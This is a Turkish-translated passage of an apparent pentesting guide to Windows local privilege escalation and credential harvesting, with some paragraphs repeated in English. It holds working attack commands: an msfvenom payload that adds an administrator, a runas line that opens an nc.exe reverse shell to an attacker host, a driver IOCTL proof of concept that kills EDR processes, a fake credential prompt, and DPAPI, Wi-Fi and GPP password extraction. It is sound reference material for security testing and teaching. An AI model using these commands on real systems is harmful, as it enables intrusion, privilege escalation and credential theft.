Bir executable'ın yolu tırnak içinde değilse, Windows boşluktan önceki her son kısmı çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tüm tırnaklanmamış servis yollarını listele:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**You can detect and exploit** this vulnerability with metasploit: `exploit/windows/local/trusted\_service\_path`  
metasploit ile elle bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir servis başarısız olduğunda uygulanacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'ye işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla ayrıntı için [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Uygulamalar

### Yüklü Uygulamalar

Kontrol edin: **permissions of the binaries** (belki birini overwrite edip privilege escalation gerçekleştirebilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı config dosyalarını değiştirip özel bir dosyayı okuyup okuyamayacağınızı ya da Administrator hesabı tarafından çalıştırılacak bir binary'i (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ eklenti otomatik yükleme kalıcılığı/çalıştırma

Notepad++ `plugins` alt klasörleri altında herhangi bir plugin DLL'i otomatik olarak yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir eklentiyi bırakmak her başlatmada `notepad++.exe` içinde otomatik kod çalıştırma sağlar (bu, `DllMain` ve eklenti callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak herhangi bir registry veya binary'yi üzerine yazıp yazamayacağını kontrol et.**\
**Oku** **aşağıdaki sayfayı**; ilginç **yetki yükseltmek için autoruns konumları** hakkında daha fazla bilgi edinmek için:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf tuhaf/zayıf** sürücüleri ara
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. Adım adım teknik için bakın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Tam zinciri öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Bu flag olmadan, secure DACL ekstra bir bileşen içeren bir yol üzerinden device açıldığında uygulanmaz; bu da herhangi bir ayrıcalıksız kullanıcının şu gibi bir namespace yolu kullanarak bir handle elde etmesine izin verir:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Gerçekte gözlemlenen örnek yetenekler:
- Rastgele süreçlere tam erişim handle'ları döndürmek (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kısıtlanmamış raw disk okuma/yazma (offline tampering, boot-time persistence tricks).
- Korunmuş Process/Light (PP/PPL) dahil rastgele süreçleri sonlandırmak; bu, kernel üzerinden user land'den AV/EDR kill'e izin verir.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için hafifletme önlemleri
- DACL ile kısıtlanması amaçlanan device nesneleri oluşturulurken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıran bağlamını doğrulayın. Süreç sonlandırma veya handle iadesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'i (access masks, METHOD_*, input validation) sınırlayın ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunucular için tespit fikirleri
- Şüpheli device isimlerinin açılışlarını user-mode'da izleyin (ör. \\ .\\amsdk*) ve kötüye kullanımı işaret eden belirli IOCTL dizilerini takip edin.
- Microsoft'un vulnerable driver blocklist'ini uygulayın (HVCI/WDAC/Smart App Control) ve kendi allow/deny listelerinizi yönetin.


## PATH DLL Hijacking

If you have **PATH içinde bulunan bir klasörde yazma izinleriniz** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file üzerinde sert kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**

Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir.

root kullanıcısı olursanız herhangi bir portu dinleyebilirsiniz (ilk kez `nc.exe` ile bir portu dinlemeye başladığınızda GUI üzerinden `nc`'nin firewall tarafından izin verilip verilmeyeceği sorulur).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz

`WSL` dosya sistemini şu klasörde inceleyebilirsiniz: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Kimlik Bilgileri Yöneticisi / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini saklar; bu, **Windows**'un **kullanıcıları otomatik olarak oturum açtırabilmesi** durumunda kullanılır. İlk bakışta, bunun kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini tarayıcılar aracılığıyla otomatik olarak oturum açmak için saklayabildiği anlamına geldiği düşünülebilir. Ancak durum böyle değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini saklar; bu da herhangi bir **Windows uygulamasının bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyması** (sunucu veya bir web sitesi) durumunda **bu Credential Manager** ve Windows Vault'tan yararlanıp, kullanıcıların kullanıcı adı ve parola girmesine gerek kalmadan sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmezse, bence belirli bir kaynak için kimlik bilgilerini kullanmaları mümkün değildir. Bu nedenle, uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynak için kimlik bilgilerini talep etmek üzere bir şekilde **credential manager ile iletişim kurmalıdır**.

Makinede depolanmış kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından kaydedilmiş kimlik bilgilerini kullanmak için `runas`'ı `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir uzak binary'yi SMB share üzerinden çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verilen kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Unutmayın: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) kullanılabilir.

### DPAPI

**Data Protection API (DPAPI)**, ağırlıklı olarak Windows işletim sistemi içinde, asimetrik özel anahtarların simetrik şifrelemesi için kullanılan verilerin simetrik şifrelenmesi yöntemini sağlar. Bu şifreleme, entropiye önemli katkı sağlayan bir kullanıcı veya sistem gizli değeri kullanır.

**DPAPI, kullanıcı giriş gizlilerinden türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesine olanak tanır**. Sistem şifrelemesini içeren senaryolarda, sistemin domain kimlik doğrulama sırlarını kullanır.

Şifrelenmiş kullanıcı RSA anahtarları DPAPI kullanılarak %APPDATA%\Microsoft\Protect\{SID} dizininde saklanır; burada {SID} kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)'sidir. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada birlikte bulunur**, genellikle 64 byte rastgele veriden oluşur. (Bu dizine erişimin kısıtlandığını, CMD'de `dir` komutuyla içeriklerin listelenmesinin engellendiğini, ancak PowerShell ile listelenebildiğini not etmek önemlidir.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Şifresini çözmek için uygun argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**Ana parola tarafından korunan kimlik bilgileri dosyaları** genellikle şu konumlarda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak şifre çözebilirsiniz.\
Birçok **DPAPI** **masterkeys**'i **memory**'den `sekurlsa::dpapi` modülü ile çıkarabilirsiniz (eğer root'sanız).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** genellikle şifrelenmiş kimlik bilgilerini pratik bir şekilde saklamanın bir yolu olarak **scripting** ve otomasyon görevlerinde kullanılır. Bu kimlik bilgileri **DPAPI** ile korunur; bu genellikle oluşturuldukları aynı bilgisayardaki aynı kullanıcı tarafından çözülebilecekleri anlamına gelir.

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Kablosuz Ağ
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Şu konumlarda bulabilirsiniz `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ 
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak herhangi bir .rdg dosyasını **şifre çözün**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module\
Mimikatz `sekurlsa::dpapi` modülü ile bellekteki birçok DPAPI masterkeys'i **çıkarabilirsiniz**

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.\
Kullanıcılar genellikle Windows iş istasyonlarında StickyNotes uygulamasını şifreleri ve diğer bilgileri **kaydetmek** için kullanır, bunun bir veritabanı dosyası olduğunu fark etmeden. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.\
**AppCmd.exe'den şifreleri kurtarmak için Yönetici olmanız ve Yüksek Integrity seviyesinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Eğer bu dosya varsa bazı **credentials** yapılandırılmış olabilir ve **kurtarılabilir**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):\
Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'den alınmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`'in varlığını kontrol edin .\
Yükleyiciler **SYSTEM privileges ile çalıştırılır**, birçoğu **DLL Sideloading (Bilgi kaynağı** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys kayıt defterinde

SSH private keys, `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarının içinde saklanabilir; bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o dizin içinde herhangi bir giriş bulursanız, muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifreli olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve her açılışta otomatik başlatılmasını istiyorsanız çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturmaya, `ssh-add` ile eklemeye ve bir makineye ssh ile giriş yapmaya çalıştım. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys mevcut değil ve procmon asimetrik anahtar doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları ayrıca **metasploit** kullanarak arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Adı **SiteList.xml** olan bir dosyayı arayın

### Önbelleğe Alınmış GPP Parolası

Daha önce Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel yerel yönetici hesaplarının dağıtımına izin veren bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL'da XML dosyaları olarak saklanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkinci olarak, bu GPP'lerdeki parolalar, halka açık olarak belgelenmiş bir varsayılan anahtar kullanılarak AES256 ile şifrelenmişti ve herhangi bir kimlikli kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine izin verebileceği için ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, "cpassword" alanı boş olmayan yerel önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda, fonksiyon parolayı çözer ve özel bir PowerShell object döndürür. Bu object, GPP ile ilgili detayları ve dosyanın konumunu içerir; bu da bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Aşağıdaki dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumlarında arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'i çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak parolaları elde etme:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Yapılandırması
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials talep et

Eğer kullanıcının bunları bilebileceğini düşünüyorsanız, her zaman **kullanıcıdan kendi credentials'ını veya farklı bir kullanıcının credentials'ını girmesini isteyebilirsiniz** (unutmayın ki müşteriden **credentials**'ı doğrudan **istemek** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials içerebilecek muhtemel dosya adları**

Bir süre önce **passwords** içeren ve bunların **clear-text** veya **Base64** olduğu bilinen dosyalar
